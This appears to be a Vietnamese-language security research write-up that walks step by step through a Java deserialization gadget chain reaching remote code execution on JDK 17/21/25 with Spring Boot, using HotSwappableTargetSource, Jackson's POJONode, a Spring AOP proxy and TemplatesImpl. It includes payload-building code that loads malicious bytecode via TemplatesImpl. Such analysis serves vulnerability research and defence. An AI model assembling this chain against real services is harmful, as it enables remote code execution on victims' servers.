
## 2. Serialization và Deserialization , Deserialization Gadget Chain on JDK 17/21/25 and Spring Boot 3.2.x-4.0.5
```java
// Users.java
import java.io.Serializable;

public class Users implements Serializable {
    public String name;
    public int age;

    public Users(String name, int age) {
        this.name = name;
        this.age = age;
    }
}
```
```java
// Test.java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class Test {
    public static void main(String[] args) throws IOException {
        String filename = "user.ser";
        Users userToSave = new Users("duc", 19);
        System.out.println("User Name: " + userToSave.name);
        System.out.println("User Age: " + userToSave.age);
        try (FileOutputStream fileOut = new FileOutputStream(filename);
                ObjectOutputStream objectOut = new ObjectOutputStream(fileOut)) {
            objectOut.writeObject(userToSave);
            System.out.println("\nDa serialize vao file : " + filename);
        }

        // Deserialize
        try (FileInputStream fileIn = new FileInputStream(filename);
                ObjectInputStream objectIn = new ObjectInputStream(fileIn)) {
            Users userFromFile = (Users) objectIn.readObject();
            System.out.println("\nDa deserialize tu file : " + filename);
            System.out.println("Name: " + userFromFile.name);
            System.out.println("Age: " + userFromFile.age);
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}
```

Trong đoạn code trên thì nó dùng `ObjectOutputStream.writeObject()` để serialize và ghi data vào file. Còn `ObjectInputStream.readObject()` là để Deserialize
Khi Deserialize , java sẽ kiểm tra xem class có định nghĩa `readObject` method hay không , nếu có thì gọi nó trước. 

### Xây dựng Gadget Chain 

**Checklist Dependencies**
```
jackson.version
JDK 17/21/25
spring-aop
```
**FULL CHAIN**
```
ObjectInputStream.readObject()
  └──► [1] HashMap.readObject() 
         └──► [2] HotSwappableTargetSource.equals()  [Cố định hashCode để ép va chạm]
                └──► [3] XString.equals(POJONode)     [Chuyển từ equals() sang toString()]
                       └──► [4] POJONode.toString()  [Jackson Serialization Introspection]
                              └──► [5] Proxy.getOutputProperties() [Qua mặt JPMS bằng Dynamic Proxy]
                                     └──► [6] JdkDynamicAopProxy.invoke() [Spring AOP Dispatcher]
                                            └──► [7] SingletonTargetSource.getTarget() ──► TemplatesImpl
                                                   └──► [8] TemplatesImpl.getOutputProperties()
                                                          └──► defineTransletClasses() [Nạp bytecode, tạo module jdk.translet]
                                                                 └──► newInstance() ──► <clinit> (static {}) ──► RCE!
```


### 1. HashMap.readObject()

Trong HashMap có xây dựng một custom `readObject()` method . Khi 2 key trong 1 HashMap xung đột (giá trị hashCode() trả về giống nhau) thì chúng sẽ gọi `key1.equals(key2)`
```java
//code trong readObject() method
for (int i = 0; i < mappings; i++) {
    K key = (K) s.readObject();      // Reconstruct key from the byte stream
    V value = (V) s.readObject();    // Reconstruct value from the byte stream
    putVal(hash(key), key, value, false, false);  // ← The chain starts here
}

final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
               boolean evict) {
    Node<K,V>[] tab; Node<K,V> p; int n, i;
    if ((tab = table) == null || (n = tab.length) == 0)
        n = (tab = resize()).length;
    if ((p = tab[i = (n - 1) & hash]) == null)
        tab[i] = newNode(hash, key, value, null);
    else {
        Node<K,V> e; K k;
        if (p.hash == hash &&
            ((k = p.key) == key || (key != null && key.equals(k))))   // CHÚ Ý Ở ĐÂY NỮA
            e = p;
        ...
    }
}
```
Trước khi đặt cặp key-value vào table thì sẽ chạy `hash(key)` trước
```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
```
Chúng ta xây dựng 2 key:
- key1 = HotSwappableTargetSource(target = POJONode) - inserted first
- key2 = HotSwappableTargetSource(target = XString) - inserted second
cuối cùng sẽ gọi: `HotSwappableTargetSource(XString).equals(HotSwappableTargetSource(POJONode))`

Mục dích hướng đến equals vì: thường ở trong mỗi class đều triển khai nó khi so sánh hai đối tượng ---> gọi setter , getter , tương tác với class khác ,.....

### 2. Hash Collision - HotSwappableTargetSource.hashCode()

Thông thường thì an object’s hashCode() depends on its internal state
```java
"hello".hashCode()
"world".hashCode()
-> different strings produce different hashes
```
Nhưng mà  `HotSwappableTargetSource().hashCode()` thì lại luôn trả về `HotSwappableTargetSource.class.hashCode()`
```java
new HotSwappableTargetSource(POJONode).hashCode()
new HotSwappableTargetSource(XString).hashCode()
new HotSwappableTargetSource("dummy").hashCode()
```

Lý do chọn class `HotSwappableTargetSource`:
- It implements Serializable.
- Its hashCode() is cố định
- Its equals() delegates to target.equals(…).

### 3. HotSwappableTargetSource.equals() → XString.equals(POJONode)

`HotSwappableTargetSource.equals(Objetc target)`:
 ```java
 @Override
public boolean equals(@Nullable Object other) {
    return (this == other || (other instanceof HotSwappableTargetSource that &&
            this.target.equals(that.target)));
            // this.target = XString
            // that.target = POJONode
            // XString.equals(POJONode)
}
 ```       
`XString.equals`:
```java
public boolean equals(Object obj2)
{
    if (null == obj2)
        return false;
    else if (obj2 instanceof XNodeSet)
        return obj2.equals(this);
    else if (obj2 instanceof XNumber)
        return obj2.equals(this);
    else
        return str().equals(obj2.toString());
    // cuối cùng gọi  str().equals(POJONode.toString());
}
```

thực tế sẽ thành: `HotSwappableTargetSource(XString).equals(HotSwappableTargetSource(POJONode))`
follow hiện tại:
```
<actual call flow>
HotSwappableTargetSource.equals()
  → this.target.equals(that.target)
  → XString.equals(POJONode)
    → obj2.toString()
    → POJONode.toString()
```

### 4. POJONode.toString() → Jackson serialize → proxy.getOutputProperties()

`POJONode` Không có method `toString()` nên theo nguyên tắc kế thừa nó sẽ gọi  `BaseJsonNode.toString()`.
```java
// BaseJsonNode.java
@Override
public String toString() {
    return InternalNodeMapper.nodeToString(this);
}



// InternalNodeMapper.java
public static String nodeToString(JsonNode n) {
    try {
        return STD_WRITER.writeValueAsString(n);
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
}
```
`STD_WRITER.writeValueAsString()` thực hiện `Jackson serialization` . Ở đây n là `POJONode` , lệnh `STD_WRITER.writeValueAsString(n)` thực hiện việc serialize đối tượng `POJONode` thành chuỗi `JSON`.
```
POJONode.toString() -----> POJONode.serialize()
```

```java
// POJONode.java
public class POJONode extends ValueNode {
    protected Object _value; // Khai báo thuộc tính _value

    // Đây là Constructor (hàm khởi tạo)
    public POJONode(Object value) {
        this._value = value; // Giá trị truyền vào (chính là proxy) được gán vào _value ở đây!
    }
}

@Override
public final void serialize(JsonGenerator gen, SerializerProvider ctxt) throws IOException
{
    if (_value == null) {
        ctxt.defaultSerializeNull(gen);
    } else if (_value instanceof JsonSerializable) {
        ((JsonSerializable) _value).serialize(gen, ctxt);
    } else {
        ctxt.defaultSerializeValue(_value, gen);
    }
}
```
`_value` chính là thứ sẽ được deserialize  hơn nữa `_value` là proterties của class `POJONode.java` nên có thể controll được thông qua contructor.

Bây giờ cần xây dựng  `_value` là Proxy(Templates) object .
```java
TemplatesImpl t = new TemplatesImpl();
// thiết lập mã độc ở đây. 
setField(t, "_bytecodes", new byte[][]{makeEvil("/tmp/PWNED_AUTO.txt")});
setField(t, "_name", "die.verwandlung.Auto");
setField(t, "_tfactory", new TransformerFactoryImpl());
setField(t, "_class", null);

SingletonTargetSource sts = new SingletonTargetSource(t);
AdvisedSupport advised = new AdvisedSupport();
advised.setTargetSource(sts);
advised.setInterfaces(Templates.class);

Constructor<?> ctor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy")
    .getDeclaredConstructor(AdvisedSupport.class);
ctor.setAccessible(true);

Templates proxy = (Templates) Proxy.newProxyInstance(
    Templates.class.getClassLoader(),
    new Class[]{Templates.class, Serializable.class},
    (InvocationHandler) ctor.newInstance(advised));
```
When Jackson calls defaultSerializeValue(_value, gen), it treats _value as a normal Java bean and looks for getters to serialize as properties. Jackson’s BeanPropertyWriter actually invokes getters reflectively as follows:

Tận dụng cơ chế tự động tìm kiếm getter của Jackson để bóp cò lệnh `proxy.getOutputProperties()`.
```java
// BeanPropertyWriter.java
final Object value = (_accessorMethod == null) ? _field.get(bean)
        : _accessorMethod.invoke(bean, (Object[]) null);
```

Chain:
```
XString.equals(POJONode)
  → POJONode.toString()
    → BaseJsonNode.toString()
      → InternalNodeMapper.nodeToString()
        → ObjectWriter.writeValueAsString()
          → POJONode.serialize()
            → ctxt.defaultSerializeValue(_value, gen)
              → Jackson serializes _value = Proxy(Templates) as a bean
              → getter discovery
              → proxy.getOutputProperties() is called
```

#### Lý do chọn Proxy bọc ngoài TemplatesImpl
- Bypass JPMS (Java Module System) vì từ JDK 9+ các class/interface nội bộ sẽ bị khóa chặt.
- Sử dụng Proxy object bọc ngoài:
    - class Proxy được  implement interface java.io.Serializable.
    - Có cơ chế `Invocation Forwarding` / `Dispatcher` để khi Jackson gọi getter trên class bọc ngoài, class đó phải có logic ngầm để chuyển hướng lời gọi đó vào TemplatesImpl nằm bên trong.
    - có ClassPath (class đó có nằm trong thư viện mà dự án sử dụng)


`proxy.getOutputProperties() ----> InvocationHandler`. 
```
InvocationHandler.invoke(proxy, method=getOutputProperties, args=null)
```
InvocationHandler là một interface trong java. Do lúc cấu trúc trước đó (xây dựng payload) thì  `JdkDynamicAopProxy` element `InvocationHandler` nên `InvocationHandler.invoke` = `JdkDynamicAopProxy.invoke`

5.JdkDynamicAopProxy.invoke()
```java
// JdkDynamicAopProxy.java
//phần 1 , 6 là quan trọng. 

// 1. Lấy ra đối tượng TemplatesImpl mang mã độc
target = targetSource.getTarget(); 

// 2. Lấy ra kiểu Class của đối tượng đó (TemplatesImpl.class)
Class<?> targetClass = (target != null ? target.getClass() : null);

// 3. Quét xem có bộ lọc AOP nào không
List<Object> chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);

// 4. Kiểm tra xem danh sách bộ lọc có trống không
if (chain.isEmpty()) {
    // 5. Chuẩn bị tham số (với getOutputProperties thì không có tham số)
    Object[] argsToUse = AopProxyUtils.adaptArgumentsIfNecessary(method, args);
    
    // 6. Dùng Reflection gọi phương thức getOutputProperties() lên đối tượng TemplatesImpl
    retVal = AopUtils.invokeJoinpointUsingReflection(target, method, argsToUse);
}
```

`targetSource.getTarget()` được gọi  thì sẽ gọi `SingletonTargetSource.getTarget()`
```java
// SingletonTargetSource.java
private final Object target;

public SingletonTargetSource(Object target) {
    this.target = target;
}

@Override
public Object getTarget() {
    return this.target;
}
```
`AopUtils.invokeJoinpointUsingReflection()`:
```java
// AopUtils.java
public static Object invokeJoinpointUsingReflection(@Nullable Object target, Method method, Object[] args)
        throws Throwable {
    // method = Templates.getOutputProperties()
    // target = TemplatesImpl
    ReflectionUtils.makeAccessible(method);
    return method.invoke(target, args);

    // trả về TemplatesImpl.getOutputProperties() vì TemplatesImpl implements Templates, Serializable
}
```

`TemplatesImpl.getOutputProperties()` thực chất là thứ sẽ load đoạn code độc hại được nhét vào `_bytecode` (properties của class `TemplatesImpl`) vào JVM để thực thi đoạn mã đó. 
Full Chain
```
Victim: new ObjectInputStream(input).readObject()
  → HashMap.readObject() → putVal()                          [JDK]
    → hash collision (HotSwappableTargetSource.hashCode() is constant) [Spring AOP]
    → HotSwappableTargetSource.equals()                      [Spring AOP]
      → XString.equals(POJONode)                             [JDK, java.xml]
        → obj2.toString()
        → POJONode.toString()                                [Jackson]
          → BaseJsonNode.toString()
          → InternalNodeMapper.nodeToString()
          → ObjectWriter.writeValueAsString()
          → POJONode.serialize()
          → ctxt.defaultSerializeValue(_value, gen)          (_value = Proxy(Templates))
            → Jackson recognizes getter on the Templates interface
            → proxy.getOutputProperties()                    [JDK Proxy]
              → JdkDynamicAopProxy.invoke()                  [Spring AOP]
                → AdvisedSupport.targetSource
                → SingletonTargetSource.getTarget()
                → target = TemplatesImpl
                → AopUtils.invokeJoinpointUsingReflection()
                  → method.invoke(TemplatesImpl)
                    → TemplatesImpl.getOutputProperties()    [JDK, java.xml]
                      → newTransformer()
                      → getTransletInstance()
                      → defineTransletClasses()
                        → "jdk.translet" module creation + export setup
                        → defineClass(_bytecodes[i])
                      → getConstructor().newInstance()
                        → <clinit>
                        → Runtime.getRuntime().exec()
                        → RCE
```

## Reference 
- https://bumjunrh.kr/posts/finding-gadgets-like-its-2026-en/